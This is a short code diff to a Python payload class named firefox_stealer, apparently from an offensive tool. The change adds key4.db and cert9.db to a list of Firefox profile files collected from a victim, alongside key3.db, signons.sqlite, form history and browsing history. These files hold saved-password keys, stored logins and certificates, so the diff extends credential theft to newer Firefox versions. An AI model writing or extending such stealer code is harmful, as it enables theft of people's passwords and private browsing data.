@@ -19,8 +19,10 @@ class firefox_stealer(Payload):
         files.append('downloads.sqlite')
         files.append('permissions.sqlite')
         files.append('key3.db')
+        files.append('key4.db')
         files.append('signons.sqlite')
         files.append('cert8.db')
+        files.append('cert9.db')
         files.append('formhistory.sqlite')
         files.append('places.sqlite')
 
